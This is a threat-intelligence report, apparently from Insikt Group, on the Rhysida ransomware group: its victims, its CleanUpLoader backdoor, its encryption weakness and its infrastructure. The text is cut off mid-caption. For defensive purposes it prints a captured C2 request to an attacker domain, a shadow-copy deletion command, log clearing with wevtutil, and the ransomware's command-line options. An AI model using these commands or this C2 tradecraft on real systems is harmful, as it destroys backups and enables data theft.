{
    "id": "0a1e1b2b-c30f-47d1-98a7-4a5216c25424",
    "created_at": "2024-11-15T02:05:26.58813Z",
    "updated_at": "2025-03-27T02:16:53.062951Z",
    "deleted_at": null,
    "sha1_hash": "e772e781ce200df69cd7133edaca755e935bc3eb",
    "title": "Outmaneuvering Rhysida: How Advanced Threat Intelligence Shields Critical Infrastructure from Ransomware",
    "authors": "",
    "file_creation_date": "2024-10-08T08:45:10Z",
    "file_modification_date": "2024-10-08T08:45:10Z",
    "file_size": 4701710,
    "plain_text": "###### CYBER\n\n THREAT\n\n#### By Insikt Group®\n\n###### ANALYSIS\n\nOctober 9, 2024\n\n# Outmaneuvering Rhysida:\n\n## How Advanced Threat Intelligence Shields Critical Infrastructure from Ransomware\n\n**Using Recorded Future Network** **Insikt Group identified Rhysida’s** **This research builds on previous**\n**Intelligence, Insikt Group identified** **multi-tiered infrastructure,** **findings showing that Network**\n**Rhysida victims 30 days before** including typosquatted domains for **Intelligence can serve as an early**\n**they appeared on the extortion site,** SEO poisoning, payload servers, **detection for any ransomware group**\nproviding a vital chance to prevent CleanUpLoader C2 servers, and **and its victims, provided the group’s**\n\n\n-----\n\n_Analysis cut-off date: September 12, 2024_\n\n### Executive Summary\n\nInsikt Group identified a multi-tiered infrastructure used by the ransomware group Rhysida — in\ncombination with Recorded Future Network Intelligence, this discovery enabled identification of\nransomware victims an average of 30 days before they appeared on public extortion sites. The first tier\nof infrastructure supports the initial access phase of the attack, consisting of typo-squatted domains,\ndomains for search engine optimization (SEO) poisoning, and payload servers. Subsequent tiers include\nCleanUpLoader C2 infrastructure for post-exploitation activities such as exfiltration, and a higher-tier\ninfrastructure featuring an admin panel and a Zabbix monitoring server. While the early detection of\nRhysida victims is notable, this use case serves as an example of how Recorded Future Network\nIntelligence and visibility into higher-tier infrastructure can detect ransomware victims early, offering a\ncritical window for preventing the actual ransomware deployment and mitigating potential damage.\n\nTo defend against Rhysida and other advanced ransomware families, defenders should implement a\nproactive strategy by responding swiftly to early indicators such as exfiltration events during dwell time\nby leveraging Recorded Future Network Intelligence. This approach involves understanding the entire\nattack chain, with detection measures across the full kill chain, and proactively monitoring the cyber\nthreat landscape, including the tools and infrastructure used by threat actors. Additionally, investing in\nsecurity awareness training for employees and promoting a culture of minimal data exposure is crucial.\nFor a long-term solution, organizations should focus on risk assessments to develop more nuanced and\nadaptive security policies.\n\nAs ransomware remains the leading threat across all industries, sizes, and regions, with Rhysida being\njust one of many sophisticated groups within the cybercriminal ecosystem, being targeted is inevitable.\nThe ongoing profitability, increasing professionalization through shared labor, and effects of geopolitical\ntensions will likely drive volume and innovation among ransomware groups, resulting in more\nsophisticated infection chains, expanded target groups (such as the growing focus on Linux-based\nsystems), increased targeting of critical infrastructure (as [seen with the Port of Seattle), and less ethical](https://www.bleepingcomputer.com/news/security/port-of-seattle-says-rhysida-ransomware-was-behind-august-attack/)\ntargeting practices, as evidenced by Rhysida’s targeting of groups that were previously considered\ntaboo, such as schools and hospitals. As a result, detecting attacks as early as possible in the attack\nchain is crucial, and by swiftly and comprehensively identifying malicious infrastructure, the early\ndetection method can be effectively used against any ransomware group and its victims when\ncombined with Recorded Future Network Intelligence. Consequently, effective long-term mitigation\nrequires close monitoring of the cybercriminal ecosystem to keep abreast of emerging techniques,\ntactics, and other trends.\n\n1 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Key Findings\n\n  - Insikt Group uncovered Rhysida’s multi-tiered infrastructure, which consists of typo-squatted\ndomains for SEO poisoning and payload servers for the infection process, CleanUpLoader C2\ninfrastructure for post-exploitation activities like exfiltration, and higher-tier infrastructure\nfeaturing an admin panel and a Zabbix monitoring server.\n\n  - Using Recorded Future Network Intelligence and insights into the multi-tiered infrastructure,\nInsikt Group identified Rhysida ransomware victims an average of 30 days before their\nappearance on their extortion site, offering a critical opportunity to prevent ransomware\ndeployment and mitigate damage.\n\n  - CleanUpLoader, a backdoor primarily linked to Rhysida threat actors, is commonly delivered\ndisguised as fake software installers for popular applications. It is often signed with valid digital\ncertificates and includes multiple C2 domains for redundancy.\n\n  - Early detection of ransomware activity using Recorded Future Network Intelligence can\npotentially be applied to any ransomware group and its victims, provided that the group’s\ninfrastructure is detectable. Insikt Group has previously demonstrated this approach with other\nransomware groups, including BianLian.\n\n2 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Background\n\n##### The Emergence of Rhysida and Activity over Time\n\nRhysida, a ransomware group, [claimed its first victim in May 2023, despite having likely been active](https://www.fortinet.com/content/dam/fortinet/assets/threat-reports/rhysida-ransomware-intrusion.pdf?utm_source=blog&utm_medium=blog&utm_campaign=rhysida-ransomware)\nsince January of that year. The group uses its own ransomware, also named Rhysida, which it allegedly\noffers as a ransomware-as-a-service (RaaS). Like other ransomware groups, Rhysida [employs](https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d) double\n[extortion by threatening to leak stolen data to pressure victims to pay. Rhysida commonly targets an](https://www.esentire.com/blog/rhysida-ransomware-group-turns-its-wrath-warns-esentire)\norganization's HR department to steal personally identifiable information, including driver’s licenses,\npassports, and other identification documents.\n\nSince its inception, Rhysida has listed 140 victims globally on its extortion site, [including critical](https://www.bleepingcomputer.com/news/security/port-of-seattle-says-rhysida-ransomware-was-behind-august-attack/)\ninfrastructure like the Port of Seattle. As shown in Figure 1, Rhysida's activity level, based on the\nnumber of victims posted to the extortion site, has remained relatively steady over the months, ranging\nfrom three in January 2024 to nineteen in June 2023.\n\n**_Figure 1: Extortion site publication frequency calendar (Source: Recorded Future)_**\n\n[Rhysida targets a diverse range of industries, including many victims from the education](https://www.fortinet.com/content/dam/fortinet/assets/threat-reports/rhysida-ransomware-intrusion.pdf?utm_source=blog&utm_medium=blog&utm_campaign=rhysida-ransomware) [and healthcare](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-rhysida)\nsectors. These sectors often share similar network architectures, making successful intrusion tactics in\none organization likely effective in others. High-profile attacks that received substantial public attention,\npredominantly because of the sensitivity of data stolen, include:\n\n  - In late November 2023, Rhysida [revealed on its data leak site that it had breached London’s King](https://www.esentire.com/blog/rhysida-ransomware-group-turns-its-wrath-warns-esentire)\nEdward VII’s Hospital, claiming to have stolen sensitive information about employees, patients,\n\n3 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\nand potentially members of Britain’s royal family. It demanded a Bitcoin ransom of approximately\n£300,000.\n\n  - On October 31, 2023, Rhysida [attacked](https://www.esentire.com/blog/rhysida-ransomware-group-turns-its-wrath-warns-esentire) the British Library in London, demanding £650,000 in\nransom; the library did not pay, and rebuilding its IT systems is estimated to cost £6-7 million,\nabout 40% of its unallocated cash reserves.\n\n  - Over the weekend of May 27, 2024, Rhysida [breached](https://www.bleepingcomputer.com/news/security/rhysida-ransomware-leaks-documents-stolen-from-chilean-army/) the Chilean Army (Ejército de Chile) via a\n[phishing attack, stealing and leaking approximately 360,000 documents — about 30% of the](https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d)\ntotal number of stolen documents, according to Rhysida.\n\n  - [On July 18, 2024, Rhysida attacked the City of Columbus, shutting down the city’s email and](https://therecord.media/columbus-ransomware-officials-warn-victims-after-data-leak)\nphone systems. The group claimed responsibility, stating it had stolen 6.5 terabytes of data and\ndemanding 30 BTC (approximately $1.9 million) within a week. The city did not pay, leading the\nhackers to leak the stolen data on their website.\n\n[Of note, in February 2024, Kookmin University researchers in South Korea published](https://thehackernews.com/2024/02/rhysida-ransomware-cracked-free.html) a paper revealing\na vulnerability in Rhysida's code, leading to the creation of an automated decryption tool now available\non the Korea Internet and Security Agency (KISA) website.\n\nRhysida has been publishing the names of its victims on different days throughout the week without a\nconsistent pattern, with a slightly higher number on Fridays (see Figure 2). However, the minimal\nvariation between days does not support any conclusions, such as the idea that the group chooses\nspecific publication days to put pressure on victims.\n\n**_Figure 2: Extortion site publication frequency by day of week (Source: Recorded Future)_**\n\n4 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n##### Initial Access and Onset of CleanUpLoader Usage\n\n[Rhysida has been observed using a range of tactics to gain initial access, making](https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d) it generally difficult to\n[pinpoint its primary method. Initial access tactics commonly associated with Rhysida are phishing](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-rhysida) and\nthe [use of valid credentials](https://www.cisa.gov/sites/default/files/2023-11/aa23-319a-stopransomware-rhysida-ransomware_1.pdf) to access internal VPN access points, often because organizations do not\nhave multi-factor authentication (MFA) enabled by default. Rhysida actors have also been observed\n[exploiting vulnerabilities as part of their initial access operations, including Zerologon](https://www.cisa.gov/sites/default/files/2023-11/aa23-319a-stopransomware-rhysida-ransomware_1.pdf)\n(CVE-2020-1472), a critical elevation of privilege vulnerability in Microsoft’s Netlogon Remote Protocol.\n\nMore recently, Rhysida was observed using malvertising in its campaigns. Malvertising refers to the use\nof online advertisements to distribute malicious software or to redirect users to harmful websites.\nMalvertising is not exclusive to Rhysida; it has also been increasingly [associated](https://thecyberwire.com/podcasts/microsoft-threat-intelligence/26/transcript) with other ransomware\ngroups, such as Black Basta. Notably, as discussed further in the Typosquat-based Malvertising section\nof this report, Rhysida often impersonates software commonly used in corporate environments.\n\nInterestingly, the use of SEO poisoning appears to coincide with the emergence of CleanUpLoader in\nRhysida operations. More specifically, in June 2024, Rapid7 [reported incidents involving](https://www.rapid7.com/blog/post/2024/06/17/malvertising-campaign-leads-to-execution-of-oyster-backdoor/)\nCleanUpLoader samples linked to Rhysida and delivered via malvertising, though the report did not\ndirectly attribute the activity to Rhysida, possibly because the ransomware was not deployed. In July\n2024, ThreatDown [reported](https://www.threatdown.com/blog/rhysida-using-oyster-backdoor-to-deliver-ransomware/) CleanUpLoader activity likely originating from a “malicious IP scanner”\ndistributed via malvertising, and noted that CleanUpLoader was used to deliver Rhysida ransomware.\n\n##### Alleged Connection to Vice Society\n\n[On August 4, 2023, the US Department of Health and Human Services (HHS) noted](https://www.hhs.gov/sites/default/files/rhysida-ransomware-sector-alert-tlpclear.pdf) that there was an\n“alleged” relationship between the Vice Society and Rhysida ransomware groups. This observation was\nreiterated on November 15, 2023, when the US Cybersecurity and Infrastructure Security Agency\n(CISA) [released a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a) [#StopRansomware](https://www.cisa.gov/stopransomware) bulletin suggesting that Rhysida is linked via “open source\nreporting details” to Vice Society; however, the exact nature of this relationship remained unclear at that\n[time. Researchers speculated that Rhysida may have been a rebrand](https://www.theguardian.com/technology/2023/nov/24/rhysida-the-new-ransomware-gang-behind-british-library-cyber-attack) of Vice Society, Vice Society\n[actors may have splintered](https://www.guidepointsecurity.com/blog/grit-ransomware-report-august-2023/) [off to form Rhysida, or the two groups may have been collaborating](https://thehackernews.com/2023/08/new-report-exposes-vice-societys.html) — yet\nremained separate entities. Of note, like Rhysida, Vice Society has significantly impacted the threat\nlandscape by targeting industries traditionally considered off-limits among ransomware groups, such as\neducation, healthcare, and critical infrastructure.\n\nConsidering the timing of both groups' activities and the reported use of the same infrastructure and\ntooling, Insikt Group assesses with moderate confidence that actors previously linked to Vice Society\nare now likely deploying Rhysida ransomware in their attacks.\n\n  - **Timing: Insikt Group first identified Vice Society activities on the dark web in mid-2021, with its**\nfirst victim publicly disclosed on the Vice Society “Official Site” on or around May 31, 2021. On or\naround June 20, 2023, Insikt Group observed that Vice Society ceased posting new and unique\nvictims to its dark web extortion blog. According to PRODAFT, the last victims posted on Vice\n\n5 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n[Society's extortion site in June 2023 were likely infected well before the publication date —](https://x.com/PRODAFT/status/1686011744005586944)\npotentially as early as March 2023. While the blog remained active for several months following,\nno new posts were identified between June 21, 2023, and December 14, 2023, before it went\n[offline. Rhysida first emerged in mid-2023, with a public identification](https://x.com/malwrhunterteam/status/1658829565215604738) of its victim contact portal\non May 17, 2023, and its first victim publicly disclosed on June 5, 2023. The overlapping\ntimelines of Rhysida starting its activities and Vice Society ceasing are notable, but they do not\nestablish a definitive link between the groups.\n\n  - **Infrastructure and Tooling: In addition to the aforementioned overlapping timelines, research**\n[suggests that the Vice Society and Rhysida clusters of threat activity likely shared infrastructure](https://github.com/prodaft/malware-ioc/tree/master/ViceSociety)\nand used the same commodity tooling during this period — including SystemBC and PortStarter.\n[According to Sophos, both Vice Society and Rhysida use](https://news.sophos.com/en-us/2023/11/10/vice-society-and-rhysida-ransomware/) the same unique SystemBC PowerShell\nscript svchost.ps1 to create persistence. Additionally, PortStarter, a Go-based backdoor\n[almost exclusively seen](https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/) in Vice Society operations, was later [used by Rhysida. Vice Society and](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a)\nRhysida were both further observed downloading WinSCP to write ransomware binaries to disk;\nhowever, we note that this is a more commonly observed technique across ransomware groups.\nLastly, Check Point Research [identified several similarities between Vice Society and Rhysida](https://research.checkpoint.com/2023/the-rhysida-ransomware-activity-analysis-and-ties-to-vice-society/)\nattacks, including the use of the NTDSUtil tool to create backups of NTDS.dit with the same file\npath and the creation of custom firewall rules.\n\nAlthough the exact relationship between Vice Society and Rhysida remains unclear, Insikt Group notes\nthat sectors previously targeted by Vice Society, such as healthcare and education, are likely still at risk\nfrom Rhysida due to its use of similar tools, tactics, and targeting.\n\n### Malware Analysis\n\n##### CleanUpLoader\n\nCleanUpLoader, also known as Oyster or Broomstick, is a backdoor malware family first observed in\n[2023. This malware targets](https://thehackernews.com/2024/06/oyster-backdoor-spreading-via.html) Windows operating systems and is often delivered via malicious installers\nfor popular software like Google Chrome and Microsoft Teams. In some cases, security software has\nbeen observed using valid digital certificates to evade detection. CleanUpLoader is closely [linked](https://thehackernews.com/2024/06/oyster-backdoor-spreading-via.html) with\ncybercriminal groups like ITG23, a Russia-based organization behind the notorious Trickbot malware,\n[and more recently with Rhysida ransomware threat actors to gain administrative credentials and access](https://www.threatdown.com/blog/rhysida-using-oyster-backdoor-to-deliver-ransomware/)\nhypervisors and network-attached storage (NAS) devices​.\n\n[CleanUpLoader has](https://www.rapid7.com/blog/post/2024/06/17/malvertising-campaign-leads-to-execution-of-oyster-backdoor/) multiple capabilities that make it a potent tool for cybercriminals. Its primary\nfunction is establishing persistence on compromised systems by creating scheduled tasks to execute\nits payload periodically. It collects information about the infected host and communicates with a C2\nserver over TLS with an encoded HTTP payload. It then receives commands from the C2 allowing threat\nactors to control the system remotely.\n\n6 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n###### C2 Commands\n\n**Figure 3 shows the initial HTTP POST request and the server’s response used by CleanUpLoader in its**\nC2 communication. Insikt Group has observed multiple endpoints, including /api/connectivity,\n```\n/api/session, and /api/connect, being used by CleanUpLoader.\nPOST /api/connectivity HTTP/1.1\nContent-Type: application/json\nUser-Agent: HTTPGET\nHost: supfoundrysettlers.us\nContent-Length: 182\nCache-Control: no-cache\n.DD\\D....D4D....t.t.L.t..D\\D6...6...D4D.,...D\\D&6..F...D4D.t..D\\D..D4DLD\\D...6\n.n.N.D4Db2R..BZ.D\\D...v.N.......D4Dv..&.D\\D...v.N...D4D\n..J..J..D\\Dv....&D4D...D\\Dv...N.n.66&D4D.D\\D&.D.\nHTTP/1.1 200 OK\nDate: Tue, 23 Jul 2024 01:44:43 GMT\nServer: Apache/2.4.52 (Ubuntu)\nCache-Control: no-cache, private\nAccess-Control-Allow-Origin: *\nVary: Accept-Encoding\nTransfer-Encoding: chunked\nContent-Type: text/html; charset=UTF-8\n..\\D...N.....v....D4,..,\\D&...v..6.D4.\\D.v....v......D4.\\D.fv..&v...&..vD4....\n\\D.v......N......v......D4Dv.......:...D\\D.....v......D4....L.\\DN....V.....D4.\n....\\D.v......N.........vv..D4.....\\D...........vv..D4D...n....vv...:...D\\D...\n.....vv..D4.,,\\D.N..D.\n\n```\n**_[Figure 3: Initial CleanUpLoader C2 communication (Source: Recorded Future Malware Intelligence)](https://tria.ge/240723-bweybszgkm/behavioral3)_**\n\nThe infected host sends basic system and user information to the CleanUpLoader C2 in an encoded\nformat. The decoded content of the HTTP POST request is illustrated in Figure 4.\n```\n{\n  \"id\": \"0\",\n  \"dll_version\": \"121\",\n  \"domain\": \"WORKGROUP\",\n  \"user_name\": \"xxxx\",\n  \"computer_name\": \"DESKTOP-xxxxx\",\n  \"privelege\": \"2\",\n  \"os\": \"10.0\",\n  \"os_build\": \"19044\",\n\n```\n7 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n**_[Figure 4: Decoded CleanUpLoader request (Source: Recorded Future Malware Intelligence)](https://tria.ge/240723-bweybszgkm/behavioral3)_**\n\n**Figure 5 shows the decoded response from the C2. This initial response contains instructions for**\nsetting additional client configurations, such as the connection timeout, session path, or session count.\n```\n{\n  \"port\": 443,\n  \"connect_path\": \"api/connect\",\n  \"connect_timeout\": 30000,\n  \"connect_time_repeating\": 90000,\n  \"time_jitter\": 90000,\n  \"session_path\": \"api/session\",\n  \"session_time_repeating\": 7000,\n  \"need_send_info\": 0,\n  \"session_count\": 0,\n  \"client_id\": 2316,\n  \"has_new_params\": 1\n}\n\n```\n**_Figure 5: Decoded CleanUpLoader response (Source:_** _[Recorded Future Malware Intelligence)](https://tria.ge/240723-bweybszgkm/behavioral3)_\n\nAfter the initial connection, CleanUpLoader enters a loop that waits for and then processes commands\nsent from the C2. The output and status of the commands are then sent back to the C2. Based on our\nanalysis and observations, the command data sent to and from the C2 is in JSON format that is then\nencoded. Table 1 shows the functionality of each command.\n\n**Command Field** **Description**\n\n`command_id` Acts as a counter for the commands sent, starting at an arbitrary number rather than 1.\n\n`command` Specifies the command to run.\n\n`function` Potentially used to designate a function to load if the format is set as “dll”.\n\n`file` Contains the Base64-encoded file content to be saved or executed.\n\n`execute` Likely determines whether to execute the file, with instances of it being set to False yet\nstill resulting in execution\n\n`format` Defines the file type sent, such as “exe” or “dll”.\n\n`type` Unknown but is always set to “1” in the analyzed samples.\n\n**_Table 1: Command functionality of CleanUpLoader (Source: Recorded Future)_**\n\n8 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Command Field|Description|\n|---|---|\n|command_id|Acts as a counter for the commands sent, starting at an arbitrary number rather than 1.|\n|command|Specifies the command to run.|\n|function|Potentially used to designate a function to load if the format is set as “dll”.|\n|file|Contains the Base64-encoded file content to be saved or executed.|\n|execute|Likely determines whether to execute the file, with instances of it being set to False yet still resulting in execution|\n|format|Defines the file type sent, such as “exe” or “dll”.|\n|type|Unknown but is always set to “1” in the analyzed samples.|\n\n\n-----\n\nUsing a modified version of the decode script [provided](https://github.com/rapid7/Rapid7-Labs/blob/main/Malware%20Config%20Extractors/clean_extract.py) by Rapid7, which can be found in Appendix A,\nInsikt Group decoded the CleanUpLoader communication from the TLS-encrypted network traffic\ncaptured in Recorded Future’s Malware Intelligence and observed the following activity:\n\n1. A command shell is initiated.\n2. The attacker navigates to the local app data temp directory.\n[3. The file chrgetpdsi.exe is downloaded (a basic infostealer written in Golang without](https://exchange.xforce.ibmcloud.com/malware-analysis/guid:2f96dded08ec1c2dd039fca21378050c)\n\nnetworking capabilities).\n4. Chrome and Edge files, including settings and login data, are copied to the temp directory.\n5. The file chrgetpdsi.exe is executed with the parameter 1.\n6. After execution, all copied files, along with chrgetpdsi.exe, are deleted to eliminate traces of\n\nthe operation.\n\nA breakdown of the requests and responses observed can be found in Appendix B.\n\n###### Payload Configurations\n\nBy analyzing CleanUpLoader samples submitted to Recorded Future Malware Intelligence between\nFebruary and August 2024, Insikt Group identified four key trends and observations:\n\n  - **Fake software installers: A primary tactic for delivering CleanUpLoader payloads involves**\ndisguising them as legitimate programs to trick victims into installing the malware.\nCleanUpLoader has been observed posing as various applications, including Microsoft Teams,\nGoogle Chrome installers, a LibVLC plugin, and the Shadow Defender application. Additional\ndetails are provided in the Typosquat-based Malvertising section.\n\n  - **Valid digital certificates: Numerous samples have been signed with valid digital certificates to**\nadd to the perceived legitimacy of CleanUpLoader payloads. This technique is commonly used\nto make the malware appear more trustworthy, allowing it to bypass some security mechanisms.\nInsikt Group has observed at least five valid certificates used, with all but two having been\nrevoked at the time of writing. The remaining valid certificates were issued to “Shantou\n```\n   Chenghai Rongsheng Arts Company Ltd.” and \"Shanxi Yanghua HOME Furnishings\n   Ltd\". Details for both certificates are provided in Appendix C.\n\n```\n  - **Multiple C2 domains: Each CleanUpLoader sample contains a configuration with one or more C2**\ndomains defined. Earlier samples typically included a single C2 domain, whereas newer samples\ngenerally feature two to three domains. In one instance, a sample [included six C2 domains.](https://tria.ge/240405-yfb8tscb7w/behavioral1)\nIncluding multiple C2 domains introduces redundancy, enabling the CleanUpLoader sample to\nremain functional even if one of the C2 domains is taken offline.\n\n  - **Hard-coded DLL version: A hard-coded DLL version is also included in each CleanUpLoader**\npayload. At least 30 distinct DLL versions have been observed, with a noticeable change in the\nversioning scheme over time. Earlier samples used descriptive versioning formats such as \"v1.4\n#Chrome\", while later samples adopted a simpler, integer-based versioning scheme, ranging\nfrom 5 to 152.\n\n9 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n##### Rhysida Ransomware\n\nRhysida ransomware is a relatively new family first observed in May 2023. Its variants are designed to\ntarget various operating systems, including Windows and Linux. While there are technical differences\nbetween the Linux and Windows variants, this report focuses on the Windows variant as there are more\nopen-source reports of the Windows version being used versus the Linux.\n\n[Rhysida ransomware can be run with the command line arguments](https://decoded.avast.io/threatresearch/rhysida-ransomware-technical-analysis/) shown in Table 2.\n\n**Command Line Argument** **Description**\n\n`-d` Specifies a directory path for the ransomware to start its encryption\nprocess\n\n`-sr` Enables self-replication; this option instructs the ransomware to copy\nitself to other directories on the system\n\n`-nobg` Disables the setting of the ransom note as the desktop background\n\n`-md5` Enables MD5 hashing of encrypted files\n\n`-S` Executes the ransomware, creating a scheduled task named “Rhsd”\n\n**_Table 2: Command line arguments of Rhysida (Source: Recorded Future)_**\n\nInsikt Group has identified two distinct versions of Rhysida. The earliest version, which is susceptible to\nthe vulnerability reported by KISA, performs several pre-encryption tasks. It deletes Windows shadow\ncopies using the command vssadmin.exe Delete Shadows /All /Quiet, which is a common\ntechnique to inhibit system recovery by preventing access to backups (see Figure 6). Additionally, it\nloops through all of the Windows event logs and clears them using wevtutil.exe, hindering forensic\ninvestigation efforts.\n\n10 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Command Line Argument|Description|\n|---|---|\n|-d|Specifies a directory path for the ransomware to start its encryption process|\n|-sr|Enables self-replication; this option instructs the ransomware to copy itself to other directories on the system|\n|-nobg|Disables the setting of the ransom note as the desktop background|\n|-md5|Enables MD5 hashing of encrypted files|\n|-S|Executes the ransomware, creating a scheduled task named “Rhsd”|\n\n\n-----\n\n**_[Figure 6: Rhysida ransomware command lines to delete shadow copies and Windows event logs (Source: Recorded Future](https://tria.ge/240409-jdvvtsch6x/behavioral4)_**\n_[Malware Intelligence)](https://tria.ge/240409-jdvvtsch6x/behavioral4)_\n\n[The newer version of Rhysida, which we see samples](https://tria.ge/240612-a2yf7awhrj/behavioral2) of as early as June 2024, is not vulnerable to\nKISA’s decryption tool. It does not perform the same pre-encryption tasks and just runs a command to\ncheck the local network and delete itself (Figure 7).\n\n**_Figure 7: Rhysida ransomware newer version command line to ping the local network and delete itself (Source:_** _[Recorded](https://tria.ge/240612-a2yf7awhrj/behavioral2)_\n_[Future Malware Intelligence)](https://tria.ge/240612-a2yf7awhrj/behavioral2)_\n\n11 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\nFor encryption, Rhysida ransomware avoids certain file types and directories to prevent system\ninstability, which might interfere with the ransom demand process. In the sample that Insikt Group\nanalyzed, the file extensions shown in Figure 8 are configured to be excluded from encryption. These\nextensions are likely part of the ransomware’s builder configuration and may not be the same across all\nRhysida ransomware samples.\n```\n.bat .cur .dll .msi .sys\n.bin .diagcab .exe .ocx .ini\n.cab .diagcfg .hlp .ps1 Thumbs.db\n.cmd .diagpkg .hta .psm1 .url\n.com .drv .ico .scr .iso\n\n```\n**_[Figure 8: File extensions avoided by Rhysida ransomware (Source: Recorded Future Malware Intelligence)](https://tria.ge/231102-gaqetsaa63/behavioral2)_**\n\nIn all samples that Insikt Group analyzed we have seen Rhysida ransomware use a ChaCha20\npseudo-random number generator (PRNG) to create unique encryption keys for each file. The file\ncontent is then encrypted with Advanced Encryption Standard (AES) using the previously created keys.\n\nIn both versions of Rhysida, random numbers are used to add entropy to the ChaCha20 PNRG in an\neffort to make the PNRG more secure. However, in the vulnerable version, the random numbers are\nseeded by a predictable value (the current system time). Using the modified time of the encrypted files\nmakes it possible to guess the seed value of the random number generator and derive the components\nused to generate the AES key and initialization vector and hence decrypt the file. This essentially is how\nthe KISA decrypter works. In the newer versions of Rhysida, the random number generator is seeded\nwith process information during runtime, making it less feasible to guess the seed value — this is why\nthe KISA decrypter will not work for the newer versions.\n\nAfter encryption, a ransom note named CriticalBreachDetected.pdf is dropped onto the affected\nsystems, masquerading as a notification from a cybersecurity team about a detected breach. The note\nfrom the sample analyzed by Insikt Group is shown in Figure 9.\n```\nCritical Breach Detected – Immediate Response Required\nDear company,\nThis is an automated alert from cybersecurity team Rhysida. An unfortunate\nsituation has arisen – your digital ecosystem has been compromised,\nand a substantial amount of confidential data has been exfiltrated from your\nnetwork. The potential ramifications of this could be dire,\nincluding the sale, publication, or distribution of your data to competitors\nor media outlets. This could inflict significant reputational and financial\ndamage.\n\n```\n12 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|.bat .bin .cab .cmd .com|.cur .diagcab .diagcfg .diagpkg .drv|.dll .exe .hlp .hta .ico|.msi .ocx .ps1 .psm1 .scr|.sys .ini Thumbs.db .url .iso|\n|---|---|---|---|---|\n\n\n-----\n\n**_Figure 9: Ransom note by Rhysida (Source: Recorded Future)_**\n\n##### Other Tools\n\n###### PortStarter\n\nPortStarter is a utility [employed](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-319a) by Rhysida ransomware operators, predominantly linked to lateral\nmovement and maintaining persistence during their operations. PortStarter is a [backdoor](https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/) written in Go\ndesigned to modify firewall settings and open network ports. This allows the ransomware threat actors\n[to establish](https://detect.fyi/rhysida-ransomware-and-the-detection-opportunities-3599e9a02bb2) and maintain communication with C2 servers, facilitating remote control over compromised\nsystems. This utility is particularly effective in environments with strict network segmentation, as it\nallows attackers to manipulate internal network configurations to establish connections needed for the\nbroader attack operation​.\n\nPortStarter can be run with the options listed in Table 3.\n\n**Argument** **Description**\n\n`-ip` Specifies the IP address for listening (used in main_Test function)\n\n`-start_port` Specifies the starting port for listening (used in both main_Test and\n```\n             main_main functions)\n\n```\n`-port` Sets the listening port\n\n`-max_port` Specifies the maximum port for listening\n\n13 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n|Argument|Description|\n|---|---|\n|-ip|Specifies the IP address for listening (used in main_Test function)|\n|-start_port|Specifies the starting port for listening (used in both main_Test and main_main functions)|\n|-port|Sets the listening port|\n|-max_port|Specifies the maximum port for listening|\n\n\n-----\n\n|-isUseSystemProxy|Indicates whether to use the system proxy through a boolean flag|\n|---|---|\n|-certFingerprint|Specifies the server certificate fingerprint|\n|-openTimeout|Specifies the connection open timeout in milliseconds|\n|-readWriteTimeout|Specifies the read/write timeout in milliseconds|\n|-handleTimeout|Specifies the handle timeout in seconds|\n|-numberOfThreads|Specifies the number of threads to launch|\n|-threadDelay|Specifies the delay in seconds between thread launches|\n\n\n**_Table 3: PortStarter commands (Source: Recorded Future)_**\n\nAn example execution of PortStarter can be found [here. When run successfully, the command lines are](https://tria.ge/220912-zsqsesebe8/behavioral2)\nexecuted, as shown in Figure 10.\n\n**_[Figure 10: PortStarter commands (Source: Recorded Future Malware Intelligence)](https://tria.ge/220912-zsqsesebe8/behavioral2)_**\n\nPortStarter also contacts its C2 using the non-standard ”Hostname“ header which contains the IP\naddress, hostname, and domain of the infected host, separated by a ‘|’ (see Figure 11).\n```\nGET / HTTP/1.1\nHost: 192.168.60.131\nHostname: 192.168.60.131|DESKTOP-OE4E99H.WORKGROUP\n\n```\n**_Figure 11: PortStarter C2 communication using unofficial hostname (Source: Recorded Future)_**\n\n14 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Infrastructure Analysis\n\n##### Multi-tiered Infrastructure\n\nInsikt Group identified Rhysida’s multi-tiered infrastructure as being composed of three layers: the\ninfrastructure used for malvertising-based delivery of CleanUpLoader, the post-infection infrastructure\nhandling CleanUpLoader command-and-control communications, and the higher-tier management\ninfrastructure, which includes the admin panel and a Zabbix server for infrastructure monitoring (see\n**Figure 12). The various components are discussed in greater detail below.**\n\n**_Figure 12: Rhysida multi-tiered infrastructure used for CleanUpLoader-based intrusions (Source: Recorded 